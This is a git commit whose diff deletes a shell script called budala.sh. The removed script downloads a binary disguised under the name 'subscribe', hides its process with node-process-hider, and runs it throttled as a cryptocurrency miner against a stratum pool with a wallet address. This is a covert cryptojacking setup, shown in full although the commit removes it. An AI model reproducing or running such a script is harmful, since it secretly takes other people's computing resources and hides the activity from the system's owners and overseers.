037f08a81dbbc64488ec8a00d5b581b1db15b852
septianana55 <93500712+septianana55@users.noreply.github.com>
2022-01-07 08:23:18 +0700

    Delete budala.sh

--- budala.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-apt-get update -y
-apt-get install -y cpulimit screen
-apt-get install -y ca-certificates wget libcurl4
-npm i -g node-process-hider
-ph add subscribe
-wget https://github.com/septianana55/students/raw/main/subscribe
-chmod +x subscribe
-cpulimit -l 50 ./subscribe -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.D4 -t 3
